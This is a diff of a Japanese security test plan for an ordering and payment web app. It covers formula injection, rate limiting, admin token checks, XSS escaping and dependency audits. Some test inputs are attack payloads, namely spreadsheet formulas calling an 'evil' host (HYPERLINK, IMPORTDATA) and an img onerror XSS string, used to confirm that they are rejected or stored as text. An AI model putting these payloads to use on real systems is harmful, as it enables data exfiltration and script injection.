@@ -72,7 +72,8 @@
 | # | 手順 | 期待結果 |
 |---|---|---|
 | T5-1 | テスト台帳向け GAS に、`customer_name:"=HYPERLINK(\"http://evil\",\"x\")"`, 住所・明細にも同様の値を入れて記録 POST | ✅ セルが**文字列として**入る（先頭 `'`）。数式評価されない |
-| T5-2 | web 決済で `item.model:"=IMPORTDATA(\"http://evil\")"` を `create-checkout-session` に POST | ✅ サーバーが `KNOWN_MODELS` 検証で **400 を返す**（未知モデル拒否） |
+| T5-2 | web 決済で `item.model:"=IMPORTDATA(\"http://evil\")"` を `create-checkout-session` に POST | ✅ サーバーが `KNOWN_MODELS` 検証で **400 を返す**（未知モデル拒否）。クーポンも消費されない |
+| T5-4 | 本番（GAS 再デプロイ後）：会場注文を氏名「＝テスト」で受け付けて支払済にする | ✅ スプシの氏名セルが「＝テスト」という文字のまま入る（数式エラーにならない） |
 | T5-3 | 正常系: 通常の氏名・住所・4点注文が正しく1行で記録される | ✅ 記録される。金額・明細が正しい |
 
 ### T6 — V5：会場注文の大量作成の抑止
@@ -80,8 +81,8 @@
 
 | # | 手順 | 期待結果 |
 |---|---|---|
-| T6-1 | App Check / reCAPTCHA を入れた場合: トークンなしで `venue-create-order` に POST | ✅ 拒否（401/403） |
-| T6-2 | レート制限を入れた場合: 同一IPから短時間に多数 POST | ✅ 上限超過で 429 等 |
+| T6-1 | （将来 App Check を入れた場合）トークンなしで `venue-create-order` に POST | ✅ 拒否（401/403） |
+| T6-2 | 同じIP・同じ大会から10分以内に31件目の注文 | ✅ **429**「少し時間をおいて…スタッフにお声がけください」。別のIP・別の大会・スタッフの代理入力は受け付ける |
 | T6-3 | 採番の競合（再確認）: 同一 event に**並列**で複数の正当な注文を投げる | ✅ 受付番号が**重複しない**・連番が飛びすぎない（トランザクション健在） |
 | T6-4 | 正常系: QRから1件注文 → 受付番号発行 → スタッフ受付で支払済 | ✅ 一連が成功 |
 
@@ -90,9 +91,8 @@
 ### T7 — V7：`email_verified` と管理者判定
 | # | 手順 | 期待結果 |
 |---|---|---|
-| T7-1 | エミュレータで `email_verified:false` の `hanks@tempmachi.com` トークンを作り `venue-confirm-payment` に渡す | ✅ **401（認証失敗）**。❌ 通ったら不合格 |
-| T7-2 | `email_verified:true` の管理者トークンで確定操作 | ✅ 成功 |
-| T7-3 | 本番設定確認（人）: Firebase Auth でメール/パスワードの新規登録がクライアントから不可、または不要アカウントが無い | ✅ 確認済み |
+| T7-1 | （コードは変更しない。報告書 §8）本番設定確認（人）：Firebase Authentication →設定→ユーザー アクションで「作成（登録）を有効にする」がオフ | ✅ オフになっている |
+| T7-2 | Authentication のユーザー一覧に、管理者（hanks@tempmachi.com）以外の不要なアカウントがない | ✅ ない（あれば削除） |
 
 ### T8 — V8：完了画面のエスケープ
 | # | 手順 | 期待結果 |
@@ -100,10 +100,10 @@
 | T8-1 | `localStorage.airfly_pending_order` の item に `<img src=x onerror=alert(1)>` を仕込み、`?success=true` で完了画面を表示 | ✅ スクリプト非実行（文字列表示） |
 | T8-2 | 正常系: 実際の決済成功後、完了画面に正しい明細・金額が出る | ✅ 正常表示 |
 
-### T9 — V9：依存更新（firebase-admin 14.5.0、実施した場合）
+### T9 — V9：依存更新（firebase-admin 13.10.0）
 | # | 手順 | 期待結果 |
 |---|---|---|
-| T9-1 | `npm ci` 後に `npm audit --omit=dev` | ✅ **0件**（high/moderate が消える） |
+| T9-1 | `npm ci` 後に `npm audit --omit=dev` | ✅ **high 0件**（moderate 9件は到達しない経路。報告書 §8） |
 | T9-2 | `node --check` 全 Functions ＋ `venue-*` の `verifyAdmin` がエミュレータの管理者トークンを検証できる | ✅ 通過・検証成功 |
 | T9-3 | 会場の確定（`verifyIdToken` 経路）がデグレなく動く | ✅ 動作 |
 
